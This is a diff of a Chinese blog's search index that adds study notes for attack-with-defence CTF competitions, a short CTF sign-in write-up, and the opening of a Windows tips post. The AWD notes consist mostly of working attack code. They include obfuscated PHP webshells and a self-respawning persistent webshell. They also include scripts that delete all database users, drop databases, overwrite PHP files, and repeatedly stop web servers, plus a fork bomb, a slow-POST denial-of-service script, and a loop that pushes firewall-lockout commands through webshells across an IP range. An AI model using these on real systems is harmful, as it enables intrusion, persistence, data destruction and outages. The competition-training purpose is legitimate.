@@ -1,6 +1,137 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AWD学习日记一</title>
+    <url>/posts/2fe68c90.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>AWD到时方恨不会，进一年两年没有打线下赛了，脚本也没有了，工具也没有。赶紧跟着大佬复习一波，做一下笔记。</p>
+<h1 id="关于AWD"><a href="#关于AWD" class="headerlink" title="关于AWD"></a>关于AWD</h1><p><strong>AWD</strong>: Attack With Defence，一般比赛中每个队伍维护两台服务器，一个web和一个pwn。web服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
+<ul>
+<li>战队有自己的初始分数；</li>
+<li>flag在主办方的设定下每隔一定时间，时间一般5-10分钟刷新一轮；</li>
+<li>其他队伍提交你的flag，你的队伍扣分，他加分；</li>
+<li>动态积分制，每一轮的分数会下降，直到最低；</li>
+<li>主办方会对每个队伍的网站或服务进行check，服务宕机扣除本轮flag分数；</li>
+<li>战队不能攻击主办方</li>
+<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
+<li>分配的pwn服务器，服务器多为ubantu，需要本地提权后再用户提权。</li>
+</ul>
+<ol>
+<li>域渗透：也可以叫内网渗透，Windows AD 域环境，更贴近实战</li>
+<li>高地模式：每只队伍服务器可以访问，没有权限，需要自己去获取权限。同时存在高地服务器，不属于任何一支队伍，每只队伍竞争高地服务器权限。</li>
+</ol>
+<p>详细参考：<a href="https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense">https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense</a></p>
+<hr>
+<h1 id="Attack-With-Defence"><a href="#Attack-With-Defence" class="headerlink" title="Attack With Defence"></a>Attack With Defence</h1><p>回忆过去的经验，打AWD比赛有几点需要注意：</p>
+<ul>
+<li>准备好一些自己熟悉常用的脚本，最起码是练习时可以使用的</li>
+<li>漏洞搜索能力，主办方出题都估计是现有漏洞，有本事0day也可以属于你</li>
+<li>快速反应能力与代码编写能力</li>
+</ul>
+<h2 id="修改ssh密码"><a href="#修改ssh密码" class="headerlink" title="修改ssh密码"></a>修改ssh密码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username</span><br><span class="line"><span class="comment"># 输入密码确认即可</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="修改数据库密码及备份数据库"><a href="#修改数据库密码及备份数据库" class="headerlink" title="修改数据库密码及备份数据库"></a>修改数据库密码及备份数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 登录 mysql 终端，运行：</span><br><span class="line">mysql&gt; set password=password(&#x27;new password&#x27;);</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">2. 修改 mysql user 表</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;update user set password=password(&#x27;new password&#x27;) where user=&#x27;root&#x27;;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">3. 使用 GRANT 语句</span><br><span class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;127.0.0.1&#x27; IDENTIFIED BY &#x27;new password&#x27; WITH GRANT OPTION;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">4. mysqladmin</span><br><span class="line">[root@ubuntu]# mysqladmin -u root password &quot;new password&quot;;（注意双引号或不加）</span><br></pre></td></tr></table></figure>
+
+<p>数据库恢复，在mysql终端执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 命令格式：source FILE_PATH</span><br><span class="line">source ~/db.sql（原数据库需存在）</span><br></pre></td></tr></table></figure>
+
+<h2 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h2><p>备份！备份！备份！</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打包目录</span></span><br><span class="line">tar -zcvf archive_name.tar.gz directory_to_compress</span><br><span class="line"><span class="comment"># 解包</span></span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure>
+
+<h2 id="查找后门"><a href="#查找后门" class="headerlink" title="查找后门"></a>查找后门</h2><p>用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用批量脚本后门攻击其他靶机。</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用工具对目标网站进行扫描，目标服务器开放的端口，方便进行漏洞利用。</p>
+<p>扫描工具：Namp，御剑等等。</p>
+<p>以下是一些服务端口的漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22：  ssh弱口令</span><br><span class="line">873： 未授权访问漏洞</span><br><span class="line">3306：mysql弱口令</span><br><span class="line">6379：redis未授权访问漏洞</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="WebShell隐藏与利用"><a href="#WebShell隐藏与利用" class="headerlink" title="WebShell隐藏与利用"></a>WebShell隐藏与利用</h2><p><strong>隐藏shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件命名形式：</span><br><span class="line">.shell.php</span><br><span class="line">-shell.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>特殊Shell形式</strong></p>
+<p>1、连接方式：php?2=assert密码是1。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="number">2</span>]).@<span class="variable">$_</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、配置为?b=))99(rhC(tseuqeR+lave</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">chr</span>( <span class="number">96</span>^<span class="number">5</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">chr</span>( <span class="number">57</span>^<span class="number">79</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">chr</span>( <span class="number">15</span>^<span class="number">110</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">chr</span>( <span class="number">58</span>^<span class="number">86</span>);</span><br><span class="line"><span class="variable">$e</span>= <span class="string">&#x27;($_REQUEST[C])&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$c</span>.<span class="variable">$d</span>.<span class="variable">$e</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3、配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=<br>连接密码:0（零）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sF</span>= <span class="string">&quot;PCT4BA6ODSE_&quot;</span>;<span class="variable">$s21</span>=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$sF</span>[<span class="number">4</span>].<span class="variable">$sF</span>[<span class="number">5</span>].<span class="variable">$sF</span>[<span class="number">9</span>].<span class="variable">$sF</span>[<span class="number">10</span>].<span class="variable">$sF</span>[<span class="number">6</span>].<span class="variable">$sF</span>[<span class="number">3</span>].<span class="variable">$sF</span>[<span class="number">11</span>].<span class="variable">$sF</span>[<span class="number">8</span>].<span class="variable">$sF</span>[<span class="number">10</span>].<span class="variable">$sF</span>[<span class="number">1</span>].<span class="variable">$sF</span>[<span class="number">7</span>].<span class="variable">$sF</span>[<span class="number">8</span>].<span class="variable">$sF</span>[<span class="number">10</span>]);<span class="variable">$s22</span>=$&#123;<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$sF</span>[<span class="number">11</span>].<span class="variable">$sF</span>[<span class="number">0</span>].<span class="variable">$sF</span>[<span class="number">7</span>].<span class="variable">$sF</span>[<span class="number">9</span>].<span class="variable">$sF</span>[<span class="number">2</span>])&#125;[<span class="string">&#x27;n985de9&#x27;</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s22</span>))&#123;<span class="keyword">eval</span>(<span class="variable">$s21</span>(<span class="variable">$s22</span>));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>4、MD5木马</p>
+<p>将pass中换成你熟悉的Md5，防止他人利用。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])==<span class="string">&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>5、MD5木马+利用header</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])==<span class="string">&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] == <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$test</span>= <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;flag:<span class="subst">$test</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>上传不死马</strong></p>
+<p>例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&#x27;</span>cmd<span class="string">&#x27;]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#passwd=y0range857</span></span><br><span class="line"><span class="comment">#POST传参：passwd=y0range857&amp;a=system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，用蚁剑连接。</p>
+<p><strong>双写入shell</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.login.php&#x27;</span>;</span><br><span class="line"><span class="variable">$file1</span> = <span class="string">&#x27;/admin/.register.php&#x27;</span>; </span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file1</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问at.php，生产不死马at2.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/upload/at.php</span><br><span class="line">获取命令</span><br><span class="line">url/upload/at2.php?passwd=obse007&amp;at=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="alias起别名"><a href="#alias起别名" class="headerlink" title="alias起别名"></a>alias起别名</h2><p>将攻击命令用改成别的命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> curl=<span class="string">&quot;echo nothing&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>删除</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unalias -a</span><br></pre></td></tr></table></figure>
+
+<p>对方执行cat /flag命令的时候回显就是错误flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias cat=&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br></pre></td></tr></table></figure>
+
+<p>获取 flag 一般是 curl <a href="http://xxx.com/flag.txt">http://xxx.com/flag.txt</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> curl=<span class="string">&#x27;echo fuckoff&#x27;</span> <span class="comment">#权限要求较低，可以在这里改成虚假的flag</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">chmod</span> -x curl <span class="comment">#权限要求较高</span></span><br><span class="line">/usr/bin curl路径</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="扰乱比赛方式-慎用"><a href="#扰乱比赛方式-慎用" class="headerlink" title="扰乱比赛方式(慎用)"></a>扰乱比赛方式(慎用)</h2><p>无限复制</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">randstr</span>().<span class="string">&#x27;.php&#x27;</span>,<span class="title function_ invoke__">file_get_content</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">      <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改数据库密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update mysql.user set authentication_string=PASSWORD(&#x27;p4rr0t&#x27;);# 修改所有用户密码</span><br><span class="line">flush privileges;</span><br><span class="line">UPDATE mysql.user SET User=&#x27;aaaaaaaaaaaa&#x27; WHERE user=&#x27;root&#x27;; </span><br><span class="line">flush privileges;</span><br><span class="line">delete from mysql.user ;#删除所有用户</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<p>重启 apache2 和 nigix</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sh</span></span><br><span class="line"><span class="keyword">while</span> [[ 1 ]]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    service apache2 stop</span><br><span class="line">    service nginx stop</span><br><span class="line"><span class="keyword">done</span> &amp;</span><br></pre></td></tr></table></figure>
+
+<p>循环删除</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getfiles</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span>) <span class="keyword">as</span> <span class="variable">$afile</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$afile</span>))</span><br><span class="line">                <span class="title function_ invoke__">getfiles</span>(<span class="variable">$afile</span>.<span class="string">&#x27;/*.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$afile</span>,<span class="string">&quot;#Anything#&quot;</span>);</span><br><span class="line">                <span class="comment">//unlink($afile);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">getfiles</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;unlink&#x27;</span>, <span class="title function_ invoke__">glob</span>(<span class="string">&quot;some/dir/*.php&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>删除数据库</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">  <span class="keyword">import</span> base64</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">rm_db</span>(<span class="params">db_user,my_db_passwd</span>):</span><br><span class="line">      cmd = <span class="string">&quot;/usr/bin/mysql -h localhost -u%s %s -e &#x27;&quot;</span>%(db_user,my_db_passwd)</span><br><span class="line">      db_name = [<span class="string">&#x27;performance_schema&#x27;</span>,<span class="string">&#x27;mysql&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">      <span class="keyword">for</span> db <span class="keyword">in</span> db_name:</span><br><span class="line">          cmd += <span class="string">&quot;drop database %s;&quot;</span>%db</span><br><span class="line">      cmd += <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">      <span class="keyword">return</span> cmd</span><br></pre></td></tr></table></figure>
+
+<p>fork_bomb</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/echo <span class="string">&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;</span><br></pre></td></tr></table></figure>
+
+<p>DOS脚本（非必要最好不要用）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="built_in">max</span>=<span class="number">90000000</span></span><br><span class="line">port=<span class="number">80</span>                 <span class="comment">#端口</span></span><br><span class="line">host=<span class="string">&quot;192.168.92.154&quot;</span>   <span class="comment">#IP</span></span><br><span class="line">page=<span class="string">&quot;/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">bag=(<span class="string">&quot;POST %s HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;host: %s\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Content-Length: 1000000000\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Cookie: 1998\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\r\n&quot;</span> % (page,host))</span><br><span class="line"></span><br><span class="line">socks = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> socks</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">max</span>):</span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.connect((host,port))</span><br><span class="line">            s.send(bag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            socks.append(s)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>():</span><br><span class="line">    <span class="keyword">global</span> socks</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> socks:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;攻击中....&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">                socks.remove(s)</span><br><span class="line">                s.close()</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">One = threading.Thread(target=connect,args=())</span><br><span class="line">Two = threading.Thread(target=send,args=())</span><br><span class="line">One.start()</span><br><span class="line">Two.start()</span><br></pre></td></tr></table></figure>
+
+<p>在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落…</p>
+<p>所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。</p>
+<p>在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。</p>
+<p>首先开启 22 80 21</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<p>然后关闭</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -j DROP</span><br></pre></td></tr></table></figure>
+
+<p>在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。</p>
+<p>遍历整个IP段，并将防火墙开启全部屏蔽掉~~</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.182&quot;</span></span><br><span class="line">port=<span class="string">&#x27;80&#x27;</span></span><br><span class="line">shell = <span class="string">&quot;/shell.php&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;a&quot;</span></span><br><span class="line">payloads = &#123;</span><br><span class="line">    passwd:<span class="string">&quot;system(\&#x27;iptables -A INPUT -j DROP&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    urls = url+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+port+shell</span><br><span class="line">    <span class="built_in">print</span>(urls+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(urls,payloads,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到主机&quot;</span>)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>AWD</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AWD学习日记二</title>
     <url>/posts/1466a239.html</url>
     <content><![CDATA[<h1 id="比赛攻击思路"><a href="#比赛攻击思路" class="headerlink" title="比赛攻击思路"></a>比赛攻击思路</h1><h2 id="搜索存活主机"><a href="#搜索存活主机" class="headerlink" title="搜索存活主机"></a>搜索存活主机</h2><p>信息收集</p>
@@ -76,6 +207,907 @@
       </categories>
       <tags>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Polarctf</title>
+    <url>/posts/f2bbe48e.html</url>
+    <content><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>打开靶机，有一个页面。需要你提交东西，但是提交按钮不能点击。</p>
+<p>查看页面源码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color:red&quot;</span>&gt;</span>我说我系签到题,你信吗<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>现在去获得flag吧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;9&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;qiandao&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">disabled</span>=<span class="string">&quot;disabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本题突破点在语言上，text限制长度9，去掉disabled就可以进行提交。先随便提交，页面会弹窗让你提交<strong>ilovejljcxy</strong>。即可得到flag</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Win10使用优化</title>
+    <url>/posts/f970716d.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下在win10的 游荡历程，保护一下个人隐私，简化使用，炫酷的大爷可以绕过，希望给各位大爷提供带点有用帮助。勿喷</p>
+<h1 id="关闭自动更新"><a href="#关闭自动更新" class="headerlink" title="关闭自动更新"></a>关闭自动更新</h1><p>相对旧机子，更新后的系统可能会影响电脑的使用体验，所以建议关闭自动更新，当你想更新时子再更新</p>
